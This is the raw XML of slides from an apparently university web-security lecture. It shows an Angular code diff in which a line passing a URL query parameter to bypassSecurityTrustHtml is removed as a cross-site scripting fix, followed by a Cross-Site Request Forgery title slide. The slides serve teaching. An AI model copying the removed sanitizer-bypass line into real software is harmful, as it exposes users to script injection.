                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-35">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-50">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>{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B="0" marT="0">
                    <a:lnR w="12700">
                      <a:solidFill>
                        <a:srgbClr val="111F35"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnR>
                    <a:lnT w="12700">
                      <a:solidFill>
                        <a:srgbClr val="111F35"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnT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276860">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="112395">
                        <a:lnSpc>
                          <a:spcPts val="1875"/>
                        </a:lnSpc>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-50">
                          <a:solidFill>
                            <a:srgbClr val="111F35"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>2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B="0" marT="0">
                    <a:lnL w="12700">
                      <a:solidFill>
                        <a:srgbClr val="111F35"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnL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54610">
                        <a:lnSpc>
                          <a:spcPts val="1875"/>
                        </a:lnSpc>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800">
                          <a:solidFill>
                            <a:srgbClr val="0000FF"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>let</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-35">
                          <a:solidFill>
                            <a:srgbClr val="0000FF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dirty="0" sz="1800">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>queryParam:</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-25">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>string</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-25">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>=</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-25">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-10">
                          <a:solidFill>
                            <a:srgbClr val="0000FF"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>this</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-10">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>.route.snapshot.queryParams.q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B="0" marT="0">
                    <a:lnR w="12700">
                      <a:solidFill>
                        <a:srgbClr val="111F35"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnR>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="279400">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="112395">
                        <a:lnSpc>
                          <a:spcPts val="1900"/>
                        </a:lnSpc>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-50">
                          <a:solidFill>
                            <a:srgbClr val="111F35"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>3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B="0" marT="0">
                    <a:lnL w="12700">
                      <a:solidFill>
                        <a:srgbClr val="111F35"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnL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54610">
                        <a:lnSpc>
                          <a:spcPts val="1900"/>
                        </a:lnSpc>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800">
                          <a:solidFill>
                            <a:srgbClr val="0000FF"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>if</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-45">
                          <a:solidFill>
                            <a:srgbClr val="0000FF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dirty="0" sz="1800">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>(queryParam)</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-30">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-50">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>{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B="0" marT="0">
                    <a:lnR w="12700">
                      <a:solidFill>
                        <a:srgbClr val="111F35"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnR>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="279400">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="112395">
                        <a:lnSpc>
                          <a:spcPts val="1900"/>
                        </a:lnSpc>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-50">
                          <a:solidFill>
                            <a:srgbClr val="111F35"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>4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B="0" marT="0">
                    <a:lnL w="12700">
                      <a:solidFill>
                        <a:srgbClr val="111F35"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnL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304165">
                        <a:lnSpc>
                          <a:spcPts val="1900"/>
                        </a:lnSpc>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>queryParam</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-30">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>=</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-15">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-10">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>queryParam.trim()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B="0" marT="0">
                    <a:lnR w="12700">
                      <a:solidFill>
                        <a:srgbClr val="111F35"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnR>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="259715">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="112395">
                        <a:lnSpc>
                          <a:spcPts val="1900"/>
                        </a:lnSpc>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-50">
                          <a:solidFill>
                            <a:srgbClr val="111F35"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>5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B="0" marT="0">
                    <a:lnL w="12700">
                      <a:solidFill>
                        <a:srgbClr val="111F35"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnL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304165">
                        <a:lnSpc>
                          <a:spcPts val="1900"/>
                        </a:lnSpc>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800">
                          <a:solidFill>
                            <a:srgbClr val="0000FF"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>this</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>.dataSource.filter</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-85">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>=</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-60">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-10">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>queryParam.toLowerCase()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B="0" marT="0">
                    <a:lnR w="12700">
                      <a:solidFill>
                        <a:srgbClr val="111F35"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnR>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="279400">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="112395">
                        <a:lnSpc>
                          <a:spcPts val="2060"/>
                        </a:lnSpc>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-50">
                          <a:solidFill>
                            <a:srgbClr val="111F35"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>6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B="0" marT="0">
                    <a:lnL w="12700">
                      <a:solidFill>
                        <a:srgbClr val="111F35"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnL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109855">
                        <a:lnSpc>
                          <a:spcPts val="2060"/>
                        </a:lnSpc>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-50">
                          <a:solidFill>
                            <a:srgbClr val="111F35"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>-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B="0" marT="0">
                    <a:solidFill>
                      <a:srgbClr val="FFC4D2"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="304165">
                        <a:lnSpc>
                          <a:spcPts val="2060"/>
                        </a:lnSpc>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800">
                          <a:solidFill>
                            <a:srgbClr val="0000FF"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>this</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>.searchValue</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-30">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>=</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-35">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-10">
                          <a:solidFill>
                            <a:srgbClr val="0000FF"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>this</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-10">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>.sanitizer.bypassSecurityTrustHtml(queryParam)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B="0" marT="0">
                    <a:lnR w="12700">
                      <a:solidFill>
                        <a:srgbClr val="111F35"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnR>
                    <a:solidFill>
                      <a:srgbClr val="FFC4D2"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="279400">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="462280">
                        <a:lnSpc>
                          <a:spcPts val="2060"/>
                        </a:lnSpc>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-50">
                          <a:solidFill>
                            <a:srgbClr val="111F35"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>6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B="0" marT="0">
                    <a:lnL w="12700">
                      <a:solidFill>
                        <a:srgbClr val="111F35"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnL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109855">
                        <a:lnSpc>
                          <a:spcPts val="2060"/>
                        </a:lnSpc>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-50">
                          <a:solidFill>
                            <a:srgbClr val="111F35"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>+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B="0" marT="0">
                    <a:solidFill>
                      <a:srgbClr val="9CE8B8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="304165">
                        <a:lnSpc>
                          <a:spcPts val="2060"/>
                        </a:lnSpc>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800">
                          <a:solidFill>
                            <a:srgbClr val="0000FF"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>this</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>.searchValue</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-30">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>=</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-35">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-10">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>queryParam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B="0" marT="0">
                    <a:lnR w="12700">
                      <a:solidFill>
                        <a:srgbClr val="111F35"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnR>
                    <a:solidFill>
                      <a:srgbClr val="9CE8B8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="299720">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="112395">
                        <a:lnSpc>
                          <a:spcPts val="2060"/>
                        </a:lnSpc>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-50">
                          <a:solidFill>
                            <a:srgbClr val="111F35"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>7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B="0" marT="0">
                    <a:lnL w="12700">
                      <a:solidFill>
                        <a:srgbClr val="111F35"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnL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304165">
                        <a:lnSpc>
                          <a:spcPts val="2060"/>
                        </a:lnSpc>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800">
                          <a:solidFill>
                            <a:srgbClr val="008000"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>/*</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-30">
                          <a:solidFill>
                            <a:srgbClr val="008000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dirty="0" sz="1800">
                          <a:solidFill>
                            <a:srgbClr val="008000"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>other</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-20">
                          <a:solidFill>
                            <a:srgbClr val="008000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dirty="0" sz="1800">
                          <a:solidFill>
                            <a:srgbClr val="008000"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>code</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-20">
                          <a:solidFill>
                            <a:srgbClr val="008000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dirty="0" sz="1800">
                          <a:solidFill>
                            <a:srgbClr val="008000"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>omitted</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-25">
                          <a:solidFill>
                            <a:srgbClr val="008000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dirty="0" sz="1800">
                          <a:solidFill>
                            <a:srgbClr val="008000"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>for</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-20">
                          <a:solidFill>
                            <a:srgbClr val="008000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dirty="0" sz="1800">
                          <a:solidFill>
                            <a:srgbClr val="008000"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>brevity</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-25">
                          <a:solidFill>
                            <a:srgbClr val="008000"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t> */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B="0" marT="0">
                    <a:lnR w="12700">
                      <a:solidFill>
                        <a:srgbClr val="111F35"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnR>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="280035">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="112395">
                        <a:lnSpc>
                          <a:spcPts val="1900"/>
                        </a:lnSpc>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-50">
                          <a:solidFill>
                            <a:srgbClr val="111F35"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>8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B="0" marT="0">
                    <a:lnL w="12700">
                      <a:solidFill>
                        <a:srgbClr val="111F35"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnL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54610">
                        <a:lnSpc>
                          <a:spcPts val="1900"/>
                        </a:lnSpc>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-50">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>}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B="0" marT="0">
                    <a:lnR w="12700">
                      <a:solidFill>
                        <a:srgbClr val="111F35"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnR>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="259079">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="112395">
                        <a:lnSpc>
                          <a:spcPts val="1900"/>
                        </a:lnSpc>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-50">
                          <a:solidFill>
                            <a:srgbClr val="111F35"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>9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B="0" marT="0">
                    <a:lnL w="12700">
                      <a:solidFill>
                        <a:srgbClr val="111F35"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnL>
                    <a:lnB w="12700">
                      <a:solidFill>
                        <a:srgbClr val="111F35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344805">
                        <a:lnSpc>
                          <a:spcPts val="1900"/>
                        </a:lnSpc>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-50">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>}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B="0" marT="0">
                    <a:lnB w="12700">
                      <a:solidFill>
                        <a:srgbClr val="111F3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R w="12700">
                      <a:solidFill>
                        <a:srgbClr val="111F35"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnR>
                    <a:lnB w="12700">
                      <a:solidFill>
                        <a:srgbClr val="111F35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397755" y="22858"/>
            <a:ext cx="5794243" cy="6835139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962050" y="3005708"/>
            <a:ext cx="9801860" cy="75692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4800" spc="175"/>
              <a:t>CROSS-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="4800" spc="-370"/>
              <a:t>SITE</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="4800" spc="15"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="4800" spc="-85"/>
              <a:t>REQUEST</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="4800" spc="-120"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="4800" spc="-45"/>
              <a:t>FORGERY</a:t>
            </a:r>
            <a:endParaRPr sz="4800"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="object 4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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="object 5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dirty="0" spc="-25"/>
              <a:t>10</a:t>
            </a:fld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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="object 5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dirty="0" spc="-25"/>
              <a:t>10</a:t>
            </a:fld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130"/>
              <a:t>CROSS-</a:t>
            </a:r>
